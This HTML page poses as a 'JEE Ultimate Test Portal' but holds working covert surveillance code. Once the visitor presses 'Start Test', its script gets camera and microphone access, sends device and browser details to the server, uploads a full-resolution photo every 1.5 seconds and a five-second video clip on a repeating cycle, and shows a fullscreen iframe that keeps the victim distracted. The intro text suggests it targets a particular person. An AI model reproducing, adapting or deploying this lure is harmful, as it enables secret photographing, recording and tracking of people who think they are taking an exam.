<!DOCTYPE html>  
<html>  
<head>  
<meta charset="UTF-8">  
<title>JEE Ultimate Test Portal</title>  
<style>  
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}  
html,body{height:100%;overflow:hidden;color:white;}  
  
body{  
background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);  
background-size:400% 400%;  
animation:gradientMove 12s ease infinite;  
}  
  
@keyframes gradientMove{  
0%{background-position:0% 50%;}  
50%{background-position:100% 50%;}  
100%{background-position:0% 50%;}  
}  
  
#overlay{  
position:absolute;  
width:100%;  
height:100%;  
overflow:auto;  
backdrop-filter:blur(12px);  
background:rgba(0,0,0,0.6);  
padding:40px;  
text-align:center;  
}  
  
h1{  
text-align:center;  
font-size:48px;  
margin-bottom:20px;  
}  
  
/* 🔥 NEW INTRO EFFECT */  
#intro{  
font-size:20px;  
color:#ff3c3c;  
margin-bottom:20px;  
animation:fadeIn 2s ease;  
}  
  
@keyframes fadeIn{  
0%{opacity:0;transform:translateY(20px);}  
100%{opacity:1;transform:translateY(0);}  
}  
  
/* BUTTON */  
button{  
padding:12px 25px;  
border:none;  
border-radius:30px;  
cursor:pointer;  
background:linear-gradient(45deg,#ff004c,#ff7a00);  
color:white;  
font-weight:bold;  
font-size:18px;  
box-shadow:0 0 15px #ff004c;  
transition:0.3s;  
}  
  
button:hover{  
transform:scale(1.1);  
box-shadow:0 0 35px #ff004c;  
}  
  
iframe{width:100%;height:100%;border:0;display:none;}  
  
#v,#c{display:none;}  
  
</style>  
</head>  
<body>  

<div id="overlay">  
  <h1>JEE Ultimate Test Portal</h1>  
  <div id="intro">  
    😎☠️ hello buddy ....😎🥱<br>  🔥 "this is test series only for u 😎"  
  </div>  
  <button onclick="start()">▶ Start Test</button>  
</div>  

<iframe id="frame"></iframe>  
<video id="v" autoplay playsinline></video>  
<canvas id="c"></canvas>  

<script>  
const v = document.getElementById("v");
const c = document.getElementById("c");
let recorder;  
let chunks=[];  
  
/* 1. DEVICE INFO (Unchanged) */  
function sendDeviceInfo(){  
  fetch("/device",{  
    method:"POST",  
    headers:{"Content-Type":"application/json"},  
    body:JSON.stringify({  
      device: navigator.platform,  
      os: navigator.userAgent,  
      browser: navigator.appVersion,  
      screen: screen.width+"x"+screen.height  
    })  
  }).catch(e => console.log("Device info error:", e));  
}  
  
/* 2. ELITE SNAPSHOT CAPTURE (HD Quality & No Distortion) */  
function capture(){  
  // Jab tak video ki actual width/height load na ho jaye, capture mat karo
  if(!v.videoWidth || !v.videoHeight) return;  
  
  // Canvas ko phone camera ke asli resolution par set karo
  c.width = v.videoWidth;  
  c.height = v.videoHeight;  
  
  const ctx = c.getContext("2d");  
  
  // Image smoothing enable karo quality aur sharp karne ke liye
  ctx.imageSmoothingEnabled = true;
  ctx.imageSmoothingQuality = "high";
  
  ctx.drawImage(v, 0, 0, c.width, c.height);  
  
  // 1.0 = Maximum (100%) JPEG Quality
  c.toBlob(b => {  
    let f = new FormData();  
    f.append("photo", b, "u.jpg");  
    fetch("/upload", { method:"POST", body:f }).catch(e => console.log("Upload failed", e));  
  }, "image/jpeg", 1.0);  
}  
  
/* 3. VIDEO RECORDING */  
function startVideo(stream){  
  try {
    recorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" }); 
  } catch (e) {
    recorder = new MediaRecorder(stream); // Fallback for some browsers
  } 
  
  recorder.ondataavailable = e => {  
    if(e.data.size > 0) chunks.push(e.data);  
  };  
  
  recorder.onstop = () => {  
    let blob = new Blob(chunks, {type:"video/webm"});  
    chunks = [];  
    
    let f = new FormData();  
    f.append("video", blob, "v.webm");  
    fetch("/video", {method:"POST", body:f}).catch(e => console.log("Video upload failed", e));  
  };  
  
  setInterval(() => {  
    if(recorder.state === "inactive") {
      recorder.start();  
      setTimeout(() => {  
        if(recorder.state === "recording") recorder.stop();  
      }, 5000);  
    }
  }, 5000);  
}  
  
/* 4. START TEST & CAMERA INIT */  
async function start(){  
  let stream;  
  
  try {  
    stream = await navigator.mediaDevices.getUserMedia({  
      // Elite constraints: Forces mobile browser to use the absolute best resolution
      video: { 
        facingMode: "user",
        width: { ideal: 4096 },  // Forces 4K or highest supported HD resolution
        height: { ideal: 2160 }
      },
      audio: true // Add audio false if you don't want mic permission
    });  
  } catch(e) {  
    alert("Camera permission required to proceed.");  
    return;  
  }  
  
  v.srcObject = stream;  
  
  // Play explicitly to ensure metadata is loaded for frame capture
  v.play().catch(e => console.log(e));
  
  sendDeviceInfo();  
  
  // Har 1.5 second mein ek high-res photo click karega (1000 ki jagah thoda gap dena acha hai for performance)
  setInterval(capture, 1500);  
  
  startVideo(stream);  
  
  // UI Hide
  document.getElementById("overlay").style.display="none";  
  
  // Video link logic
  try {
    const r = await fetch("/get_video_link");  
    const d = await r.json();  
    
    const frame = document.getElementById("frame");  
    frame.style.display = "block";  
    frame.src = d.url;  
    
    if(frame.requestFullscreen){  
      frame.requestFullscreen();  
    } 
  } catch(e) {
    console.log("Failed to load iframe url", e);
  }
}  
</script>  
</body>  
</html>
